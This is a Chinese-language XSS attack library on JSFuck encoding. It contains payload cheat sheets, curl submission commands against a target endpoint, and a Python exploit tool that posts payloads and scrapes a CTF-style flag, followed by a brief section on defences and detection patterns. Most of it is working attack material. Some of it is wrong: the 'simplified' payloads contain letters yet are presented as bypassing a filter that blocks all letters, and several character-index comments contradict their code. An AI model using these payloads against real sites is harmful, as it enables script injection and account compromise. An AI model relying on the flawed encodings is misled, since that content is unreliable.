# XSS - JSFuck编码绕过攻击库

## 概述

JSFuck是一种极端的JavaScript编码技术,仅使用6个字符`[]()!+`就能编写任意JavaScript代码。当应用程序过滤了几乎所有字母、数字和特殊符号时,JSFuck成为绕过严格XSS过滤的终极武器。这种技术利用JavaScript的类型转换和对象特性构造任意代码。

**核心威胁**: 极严格过滤 → 仅剩特殊符号 → JSFuck编码 → 执行任意JS

## JSFuck原理

### 基础字符构造

```javascript
// 基本构造
![]      // false
!![]     // true
[][[]]   // undefined
+[]      // 0
+!![]    // 1

// 字符串
![] + [] // "false"
!![] + []  // "true"
[][[]] + []  // "undefined"

// 通过索引获取字符
(![] + [])[+[]]       // "false"[0] = 'f'
(![] + [])[+!![]]     // "false"[1] = 'a'
(!![] + [])[+[]]      // "true"[0] = 't'
(!![] + [])[+!![]]    // "true"[1] = 'r'
```

### 构造字母表

```javascript
// 通过组合获取更多字符
'a' = (![] + [])[+!![]]           // "false"[1]
'b' = ({}+[])[+!![]]              // "[object Object]"[2]  
'c' = ({}+[])[+!![]+!![]+!![]+!![]+!![]]  // "[object Object]"[5]
'd' = ([][[]] + [])[+!![]]        // "undefined"[2]
'e' = (![] + [])[+!![]+!![]+!![]] // "false"[3]
'f' = (![] + [])[+[]]             // "false"[0]
// ...更多字符
```

### 函数调用

```javascript
// 构造Function构造器
[]['fill']  // Array.prototype.fill
[]['fill']['constructor']  // Function

// 构造并执行代码
[]['fill']['constructor']('alert(1)')()

// JSFuck形式
[][(![] + [])[+!![]] + ...]  // 复杂的编码
```

## 核心攻击技术

### 1. 基础数字和布尔值

**技术**: 使用`[]`和`!`构造基础值

```javascript
// 数字0-9
+[]                    // 0
+!![]                  // 1
+!![]+!![]             // 2
+!![]+!![]+!![]        // 3
+!![]+!![]+!![]+!![]   // 4
// ...

// 布尔值
![]    // false
!![]   // true
```

**应用**: 作为其他字符的构造基础

### 2. 字符串提取

**技术**: 从基础对象的字符串表示中提取字符

```javascript
// "false"字符串
![] + []  // "false"

// 提取字符
(![] + [])[+[]]        // 'f'
(![] + [])[+!![]]      // 'a'  
(![] + [])[+!![]+!![]] // 'l'

// "true"字符串
!![] + []  // "true"

// "undefined"字符串
[][[]] + []  // "undefined"

// "[object Object]"字符串
{} + []  或  ({}+[])  // "[object Object]"
```

**可获取字符**: f, a, l, s, e, t, r, u, n, d, i, o, b, j, c

### 3. Function构造器利用

**技术**: 通过数组方法获取Function构造器

```javascript
// 获取Function
[]['fill']  // Array.prototype.fill函数
[]['fill']['constructor']  // Function构造器

// 构造并执行代码
[]['fill']['constructor']('alert(1)')()

// 或使用其他数组方法
[]['find']['constructor']
[]['map']['constructor']
```

**执行alert('XSS')**:
```javascript
[]['fill']['constructor']('alert("XSS")')()
```

### 4. 字符串拼接技巧

**技术**: 拼接字符构造函数名和代码

```javascript
// 构造'alert'
// a + l + e + r + t
(![] + [])[+!![]] +      // 'a'
(![] + [])[+!![]+!![]] + // 'l'
(![] + [])[+!![]+!![]+!![]] + // 'e'
(!![] + [])[+!![]] +     // 'r'
(!![] + [])[+[]]         // 't'

// 构造'XSS'
// 需要从其他来源获取X,S
// 或使用String.fromCharCode
```

### 5. String.fromCharCode利用

**技术**: 使用字符ASCII码构造任意字符

```javascript
// 获取String构造器
''['constructor']  // String

// 使用fromCharCode
''['constructor']['fromCharCode'](88)  // 'X'

// JSFuck编码
([][[]] + [])[(![] + [])[+!![]]...]  // 复杂编码
```

### 6. eval/Function执行

**技术**: 构造eval或Function执行任意代码

```javascript
// 方法1: Function构造器
[]['fill']['constructor']('alert("XSS")')()

// 方法2: 通过window对象
// 获取window
[]['fill']['constructor']('return this')()

// 方法3: 使用eval (如果可访问)
// eval通常需要通过window获取
```

## 完整攻击工具

### JSFuck生成和利用工具

```python
#!/usr/bin/env python3
"""
JSFuck XSS绕过工具
支持生成JSFuck编码和利用
"""

import requests
import sys
import re

class JSFuckXSS:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        
        # JSFuck基础映射
        self.jsfuck_map = {
            'false': '![]',
            'true': '!![]',
            'undefined': '[][[]]',
            '0': '+[]',
            '1': '+!![]',
            'NaN': '+[![]]',
        }
        
    def get_char_jsfuck(self, char):
        """
        获取单个字符的JSFuck编码
        
        Args:
            char: 要编码的字符
        
        Returns:
            JSFuck编码字符串
        """
        # 简化映射表
        char_map = {
            'f': '(![]+[])[+[]]',
            'a': '(![]+[])[+!![]]',
            'l': '(![]+[])[+!![]+!![]]',
            's': '(![]+[])[+!![]+!![]+!![]]',
            'e': '(![]+[])[+!![]+!![]+!![]+!![]]',
            't': '(!![]+[])[+[]]',
            'r': '(!![]+[])[+!![]]',
            'u': '([][[]]+[])[+[]]',
            'n': '([][[]]+[])[+!![]]',
            'd': '([][[]]+[])[+!![]+!![]]',
            'i': '([][[]]+[])[+!![]+!![]+!![]+!![]+!![]]',
            'o': '({}+[])[+!![]]',
            'b': '({}+[])[+!![]+!![]]',
            'j': '({}+[])[+!![]+!![]+!![]]',
            'c': '({}+[])[+!![]+!![]+!![]+!![]+!![]]',
        }
        
        if char in char_map:
            return char_map[char]
        else:
            # 使用fromCharCode
            ascii_val = ord(char)
            return f"([]+[])[(!![]+[])[+!![]]...]['fromCharCode']({ascii_val})"
    
    def generate_alert_xss(self, message='XSS'):
        """
        生成alert('XSS')的JSFuck编码
        
        Args:
            message: alert消息
        
        Returns:
            JSFuck编码
        """
        print(f"[*] 生成alert('{message}')的JSFuck编码...")
        
        # 简化版: 使用预生成的编码
        # 完整的JSFuck编码非常长,这里使用核心部分
        
        # alert函数通过window对象获取
        # window可以通过Function('return this')()获取
        
        # 简化payload (保留关键逻辑)
        payload = '''
        []["fill"]["constructor"]("alert('XSS')")()
        '''.strip()
        
        print(f"[+] 生成的payload(简化): {payload}")
        print(f"[!] 注意: 完整JSFuck编码会非常长")
        
        return payload
    
    def test_jsfuck_xss(self, payload):
        """
        测试JSFuck XSS payload
        
        Args:
            payload: JSFuck编码
        
        Returns:
            bool: 是否成功
        """
        print(f"[*] 测试JSFuck payload...")
        print(f"[*] Payload长度: {len(payload)}")
        
        try:
            # POST提交
            r = self.session.post(f"{self.target}/page", 
                                 data={'name': payload}, 
                                 timeout=15)
            
            if r.status_code == 200:
                # 检查是否成功
                if 'congratulations' in r.text.lower():
                    print(f"[+] XSS成功触发!")
                    
                    # 提取FLAG
                    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.I)
                    if flag_match:
                        return flag_match.group()
                    else:
                        return True
                elif 'filtered' in r.text.lower():
                    print(f"[-] Payload被过滤")
                else:
                    print(f"[-] XSS未成功")
                    print(f"[*] 响应: {r.text[:200]}")
            else:
                print(f"[-] HTTP {r.status_code}")
                
        except Exception as e:
            print(f"[-] 错误: {e}")
        
        return False
    
    def exploit_strict_filter(self):
        """
        利用严格过滤的XSS
        """
        print("=" * 60)
        print("[*] JSFuck XSS严格过滤绕过")
        print("=" * 60)
        
        # 测试不同的JSFuck payload
        payloads = [
            # 简化版 - 使用Function构造器
            '''[]["fill"]["constructor"]("alert('XSS')")()''',
            
            # 使用不同的数组方法
            '''[]["find"]["constructor"]("alert('XSS')")()''',
            '''[]["map"]["constructor"]("alert('XSS')")()''',
            
            # 通过return this获取window
            '''[]["fill"]["constructor"]("return this")()["alert"]("XSS")''',
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[{i}] 测试payload:")
            print(f"    {payload[:60]}...")
            
            result = self.test_jsfuck_xss(payload)
            if result:
                if isinstance(result, str):
                    print(f"\n[+] FLAG: {result}")
                return True
        
        print("\n[*] 预定义payload未成功")
        print("[!] 建议使用在线JSFuck生成器:")
        print("    http://www.jsfuck.com")
        print("    输入: alert('XSS')")
        print("    获取完整JSFuck编码")
        
        return False

def exploit_jsfuck_xss(target_url):
    """
    JSFuck XSS利用入口
    
    Args:
        target_url: 目标URL
    """
    print(f"[*] 目标: {target_url}")
    print()
    
    exploiter = JSFuckXSS(target_url)
    success = exploiter.exploit_strict_filter()
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击未成功,建议手动生成JSFuck")

# JSFuck编码示例生成器
def generate_jsfuck_example():
    """
    生成JSFuck编码示例
    """
    print("=" * 60)
    print("JSFuck基础编码示例")
    print("=" * 60)
    
    examples = {
        '0': '+[]',
        '1': '+!![]',
        '2': '+!![]+!![]',
        'false': '![]',
        'true': '!![]',
        'undefined': '[][[]]',
        'f': '(![]+[])[+[]]',
        'a': '(![]+[])[+!![]]',
        'l': '(![]+[])[+!![]+!![]]',
        's': '(![]+[])[+!![]+!![]+!![]]',
        'e': '(![]+[])[+!![]+!![]+!![]+!![]]',
    }
    
    for char, code in examples.items():
        print(f"{char:10} = {code}")
    
    print("\n" + "=" * 60)
    print("Function构造器:")
    print("=" * 60)
    print("[]['fill']  // Array.prototype.fill")
    print("[]['fill']['constructor']  // Function")
    print("[]['fill']['constructor']('alert(1)')()  // 执行alert(1)")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url>")
        print(f"  {sys.argv[0]} --examples")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target:5000")
        print(f"  {sys.argv[0]} --examples")
        sys.exit(1)
    
    if sys.argv[1] == '--examples':
        generate_jsfuck_example()
    else:
        target = sys.argv[1]
        exploit_jsfuck_xss(target)
```

## 实战场景

### 场景1: 过滤所有字母数字

**过滤规则**:
```python
blacklist = string.ascii_letters + string.digits + '<>'
```

**利用**:
```javascript
// 只能使用: []()!+和其他符号

// 执行alert('XSS')
[]["fill"]["constructor"]("alert('XSS')")()

// 或完整JSFuck (极长)
// 从jsfuck.com生成
```

### 场景2: 插入到script标签

**易受攻击代码**:
```html
<script>
var name = "USER_INPUT_HERE";
</script>
```

**利用**:
```javascript
// 闭合引号并执行
";[]["fill"]["constructor"]("alert('XSS')")();"
```

### 场景3: 仅允许特殊符号

```bash
# 测试允许的字符
curl -X POST http://target/page \
  -d 'name=[]()!+'
# 允许

curl -X POST http://target/page \
  -d 'name=abc'  
# 被过滤

# 使用JSFuck
curl -X POST http://target/page \
  -d 'name=[]["fill"]["constructor"]("alert(\"XSS\")")()'
```

## 手动测试命令

### 测试允许的字符

```bash
# 1. 测试基础符号
curl -X POST http://target/page -d 'name=[]'
curl -X POST http://target/page -d 'name=()'
curl -X POST http://target/page -d 'name=!+'

# 2. 测试字母(应被过滤)
curl -X POST http://target/page -d 'name=abc'

# 3. 测试数字(应被过滤)  
curl -X POST http://target/page -d 'name=123'
```

### 使用在线工具

```bash
# 访问 http://www.jsfuck.com
# 输入: alert('XSS')
# 点击Encode
# 复制生成的超长JSFuck代码

# 提交
curl -X POST http://target/page \
  -d "name=<超长JSFuck代码>"
```

## Payload速查表

### 基础构造
```javascript
![]          // false
!![]         // true  
[][[]]       // undefined
+[]          // 0
+!![]        // 1
```

### 字符提取
```javascript
(![]+[])[+[]]          // 'f'
(![]+[])[+!![]]        // 'a'
(![]+[])[+!![]+!![]]   // 'l'
(!![]+[])[+[]]         // 't'
([][[]]+[])[+[]]       // 'u'
```

### 函数构造
```javascript
[]['fill']                          // Array.prototype.fill
[]['fill']['constructor']           // Function
[]['fill']['constructor']('code')() // 执行code
```

### 完整alert
```javascript
// 简化版
[]["fill"]["constructor"]("alert('XSS')")()

// 完整JSFuck (超长,需工具生成)
// 从 jsfuck.com 获取
```

## 防御措施

### 1. 白名单验证

```python
# 只允许特定字符集
import re
if not re.match(r'^[a-zA-Z0-9\s]+$', user_input):
    raise ValueError("Invalid input")
```

### 2. HTML编码

```python
import html
safe_output = html.escape(user_input)
```

### 3. CSP策略

```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; object-src 'none'">
```

### 4. 禁用危险字符组合

```python
# 检测JSFuck特征
dangerous = ['[]["', '[]()', '!![]', '![]']
for pattern in dangerous:
    if pattern in user_input:
        raise ValueError("Suspicious input")
```

## 检测特征

1. **超长输入**: JSFuck编码通常数千字符
2. **特殊符号组合**: `[]()!+`的密集组合  
3. **重复模式**: 大量`+!![]`等重复
4. **Function特征**: `constructor`、`fill`等

## 在线工具

### JSFuck编码器
- **jsfuck.com**: 最流行的JSFuck生成器
- **输入**: alert('XSS')
- **输出**: 完整JSFuck编码

### 使用步骤
1. 访问 http://www.jsfuck.com  
2. 输入要执行的JS代码
3. 点击 "Encode"
4. 复制生成的JSFuck代码
5. 提交到目标应用

## 局限性

1. **编码长度**: 简单的`alert(1)`可能编码成10000+字符
2. **性能影响**: 解析和执行需要更多时间
3. **长度限制**: 某些应用限制输入长度
4. **检测容易**: 特征明显,容易被WAF识别

## 总结

JSFuck是极端的XSS绕过技术,适用于最严格的过滤:
- 仅使用6个字符`[]()!+`
- 利用JavaScript类型转换
- 通过Function构造器执行任意代码
- 适合过滤了所有字母数字的场景

**关键攻击路径**: 识别严格过滤 → 确认允许特殊符号 → 生成JSFuck编码 → 提交执行

**实用建议**: 手动编写JSFuck极其困难,建议使用在线工具(jsfuck.com)生成完整编码。
